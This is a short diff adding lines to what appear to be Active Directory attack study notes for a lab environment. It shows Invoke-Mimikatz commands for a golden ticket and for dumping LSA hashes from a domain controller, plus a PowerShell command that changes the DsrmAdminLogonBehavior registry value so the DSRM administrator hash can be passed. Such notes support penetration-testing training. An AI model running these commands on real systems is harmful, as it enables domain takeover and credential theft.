@@ -443,3 +443,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 
 **Compare the Administrator hash with the Administrator hash of below command**
 - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
+- First one is the DSRM local Administrator
+
+- Since it is the local administrator of the DC, we can pass the hash to authenticate.
+- But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
+- `Enter-PSSession -ComputerName dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
